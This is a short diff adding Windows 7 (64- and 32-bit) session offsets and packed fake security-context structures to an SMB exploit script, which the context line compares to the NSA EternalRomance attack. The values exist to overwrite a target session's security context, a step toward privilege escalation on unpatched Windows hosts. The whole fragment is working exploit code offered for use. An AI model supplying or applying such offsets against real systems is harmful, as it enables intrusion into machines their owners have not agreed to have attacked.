@@ -60,3 +60,17 @@ So this exploit has a chance to crash target same as NSA eternalromance against 
 ###########################
 # info for modify session security context
 ###########################
+
+WIN7_64_SESSION_INFO = {
+	'SESSION_SECCTX_OFFSET': 0xa0,
+	'SESSION_ISNULL_OFFSET': 0xba,
+	'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
+	'SECCTX_SIZE': 0x28,
+}
+
+WIN7_32_SESSION_INFO = {
+	'SESSION_SECCTX_OFFSET': 0x80,
+	'SESSION_ISNULL_OFFSET': 0x96,
+	'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
+	'SECCTX_SIZE': 0x1c,
+}
